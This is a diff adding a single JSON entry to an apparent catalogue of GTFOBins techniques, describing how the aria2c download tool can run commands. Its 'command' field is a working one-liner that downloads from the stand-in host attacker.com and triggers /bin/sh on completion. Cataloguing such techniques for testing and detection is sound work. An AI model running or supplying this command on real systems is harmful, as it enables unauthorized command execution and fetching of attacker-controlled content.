@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-aria2c-command-2",
+  "name": "GTFOBins · aria2c (command) #2",
+  "command": "aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=/bin/sh http://attacker.com/aaaaaaaaaaaaaaaa",
+  "description": "Use aria2c to command via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "aria2c",
+    "command"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/aria2c/#command",
+  "upstream_id": "aria2c/command/1",
+  "category": "gtfobins",
+  "subcategory": "command",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/aria2c/"
+    }
+  ]
+}
